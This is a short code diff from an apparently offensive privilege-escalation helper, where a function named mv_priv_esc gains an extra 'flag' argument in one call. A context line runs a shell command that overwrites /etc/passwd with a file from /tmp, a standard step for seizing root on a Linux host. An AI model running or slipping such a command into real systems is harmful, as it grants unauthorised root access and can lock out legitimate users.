@@ -744,7 +744,7 @@ def mv_priv_esc(bold, green, blue, warning, endc):
     os.system("mv /tmp/passwd /etc/passwd")
 
     #call function named other_msg
-    other_msg(bold, green, blue, warning, endc)
+    other_msg(flag, bold, green, blue, warning, endc)
 
 
 #auto_chmod_msg function
